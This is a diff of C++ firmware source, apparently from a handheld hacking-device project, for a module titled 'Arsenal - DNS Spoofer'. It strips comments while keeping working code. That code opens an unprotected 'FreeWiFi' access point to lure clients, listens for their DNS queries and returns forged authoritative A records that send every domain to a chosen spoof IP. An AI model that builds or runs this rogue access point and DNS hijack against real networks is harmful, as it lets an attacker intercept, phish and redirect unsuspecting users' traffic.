@@ -1,9 +1,3 @@
-// ═══════════════════════════════════════════════════════════
-// Arsenal - DNS Spoofer
-// Redirects DNS queries to our IP when running as AP
-// All domains or specific targets can be redirected
-// ═══════════════════════════════════════════════════════════
-
 #include "arsenal.h"
 #include "core/display.h"
 #include "core/mykeyboard.h"
@@ -17,7 +11,7 @@ static bool dnsRunning = false;
 static int queriesIntercepted = 0;
 static String lastDomain = "";
 
-// DNS header structure
+
 struct DNSHeader {
     uint16_t id;
     uint16_t flags;
@@ -45,51 +39,50 @@ static String parseDomainName(uint8_t *data, int offset, int len) {
 static void sendDNSResponse(uint8_t *query, int queryLen, IPAddress clientIP, uint16_t clientPort, IPAddress spoofIP) {
     if (queryLen < 12) return;
 
-    // Build response based on query
+
     uint8_t response[512];
     int respLen = 0;
 
-    // Copy header
+
     memcpy(response, query, 12);
     respLen = 12;
 
-    // Set response flags: QR=1, AA=1, RA=1
-    response[2] = 0x84;  // QR=1, Opcode=0, AA=1
-    response[3] = 0x00;  // RA=0, RCODE=0
 
-    // Set answer count to 1
+    response[2] = 0x84;
+    response[3] = 0x00;
+
+
     response[6] = 0x00;
     response[7] = 0x01;
 
-    // Copy question section
+
     int qEnd = 12;
     while (qEnd < queryLen && query[qEnd] != 0) {
         qEnd += query[qEnd] + 1;
     }
-    qEnd += 5;  // null byte + QTYPE(2) + QCLASS(2)
+    qEnd += 5;
 
     memcpy(response + 12, query + 12, qEnd - 12);
     respLen = qEnd;
 
-    // Answer section
-    // Name pointer to question
+
     response[respLen++] = 0xC0;
     response[respLen++] = 0x0C;
-    // Type A
+
     response[respLen++] = 0x00;
     response[respLen++] = 0x01;
-    // Class IN
+
     response[respLen++] = 0x00;
     response[respLen++] = 0x01;
-    // TTL (60 seconds)
+
     response[respLen++] = 0x00;
     response[respLen++] = 0x00;
     response[respLen++] = 0x00;
     response[respLen++] = 0x3C;
-    // Data length (4 for IPv4)
+
     response[respLen++] = 0x00;
     response[respLen++] = 0x04;
-    // IP address
+
     response[respLen++] = spoofIP[0];
     response[respLen++] = spoofIP[1];
     response[respLen++] = spoofIP[2];
@@ -102,11 +95,11 @@ static void sendDNSResponse(uint8_t *query, int queryLen, IPAddress clientIP, ui
 
 void arsenal_dns_spoofer(void) {
     ARSENAL_SAFE_RUN([]() {
-        // Must be running as AP
+
         if (WiFi.getMode() != WIFI_MODE_AP && WiFi.getMode() != WIFI_MODE_APSTA) {
-            // Start AP mode
+
             WiFi.mode(WIFI_AP);
-            WiFi.softAP("FreeWiFi", "");  // open network to attract clients
+            WiFi.softAP("FreeWiFi", "");
             delay(100);
         }
 
@@ -153,7 +146,7 @@ void arsenal_dns_spoofer(void) {
             tft.setTextColor(TFT_RED, bruceConfig.bgColor);
             tft.drawCentreString("Esc to stop", tftWidth / 2, tftHeight - 20, 1);
 
-            // Process DNS queries
+
             int packetSize = dnsUDP.parsePacket();
             if (packetSize > 0) {
                 uint8_t buffer[512];
